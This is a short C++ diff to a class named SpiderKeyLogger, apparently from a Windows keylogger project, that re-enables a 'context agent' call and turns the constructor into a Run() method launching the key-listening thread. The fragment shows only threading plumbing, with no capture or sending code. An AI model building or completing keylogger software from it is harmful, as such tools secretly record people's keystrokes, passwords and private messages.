@@ -19,7 +19,7 @@ private:
 	std::unique_ptr<IWindowsKeyListener> KeyListener = std::unique_ptr<IWindowsKeyListener>(new WindowsKeyListener());
 
 	static void RunKeyLogger(IWindowsContextAgent *contextAgent, IWindowsKeyListener *keyListener) {
-		//contextAgent->Run();
+		contextAgent->Run();
 		keyListener->Run();
 		while (true) {
 			std::this_thread::sleep_for(std::chrono::milliseconds(10));
@@ -27,7 +27,7 @@ private:
 	}
 
 public:
-	SpiderKeyLogger() {
+	void Run() {
 		_keyLoggerThread = std::unique_ptr<std::thread>(new std::thread(RunKeyLogger, ContextAgent.get(), KeyListener.get()));
 		
 	}
